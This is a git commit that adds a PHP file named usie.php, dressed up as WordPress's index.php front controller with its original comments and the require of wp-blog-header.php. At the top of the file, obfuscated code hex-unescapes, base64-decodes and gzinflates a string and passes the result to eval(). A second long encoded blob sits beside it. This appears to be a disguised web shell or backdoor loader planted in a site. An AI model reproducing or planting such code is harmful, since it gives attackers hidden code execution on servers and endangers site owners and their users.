26231f1c090f4943abb5eebdec277534d5b830e3
eagles227 <166109731+eagles227@users.noreply.github.com>
2024-12-03 08:15:30 +0000

    Create usie.php

---
+++ usie.php
@@ -0,0 +1,22 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
+$Lix = "==Ae8IfjWUroSAwfv/SvpX1z9rsLubnV4JscL8vOrPA7SWOk10cKOEGHIi+YMvvAVozCYRZ4yhuUjxA8xlQyJLHMwD3sJh5I32arJpQjiB1Xo4smjvZE6XorujDD2w+22IPxanQVjG2T7IHxpCjrB53c5ZBv32+gUJbdl90aDYofLKqSyK14cPtM/Zhd1pm6qgngR1b3+K30puGOqhSzWEkU4QZspcN/FbsBouEXkB71DQk0cR5L6Y5lBssITcSf0rsqTVssbvzH0+dixp2NFI/jGa/DTd/eR5IJGyWBRl4TyNs1uk8jkt8zlgfwHjrxFZ+Th4OfAnZSKT/pcSwiQUiHL0k8dVX1p9oZALj/7cza7YkXjJ4YqsI/xCSOllTFsbNTpPTWK94EO82CSTlZ56E+k6dTmCpVdT2+i3xWgbWh5jZs5hJhqqBhTisonf/21NiGaS8IVqQiE20TtBL2Q3RiwcdTvzfbet8XHvj1xX3uBcVD3B3LYfoonh4r8nGrJdfdmy5Pg3TMRgFM/F1BZoLfY4XRhjlf2kHh6wHoBfwDSzvJqj+1o3se0H5+bNcR9BR0LH8K0WhvoMlAXepjrKPX0h5i6nhzogZGnQwwjFcaHsx2i12IUw7jJJWIGARVBfIhTbAtDHpSxyetH36jcBx/UvV4dvBf4N+6HI8D8Cy5RfcwcUMyMOKaXmUQxhsaBMFcZovzgOtuHyT7bPANV4ZUbkDpYMO9bWkqeuPHgaSgNhnI/+lKyp37Onf3j799ATEiTz+up9DI78e/WuILb3SsbQMHOIkqk2dpKqtyFprGKyisSF29NtgUCo6iD+fa+0PEws5bvTVvciX/KKQdBwJe9/nAAGQ/6JQhB0fdCoYA";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+/**
+ * Front to the WordPress application.
+ * 
+ * This file doesn't do anything, but loads wp-blog-header.php which does 
+ * and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
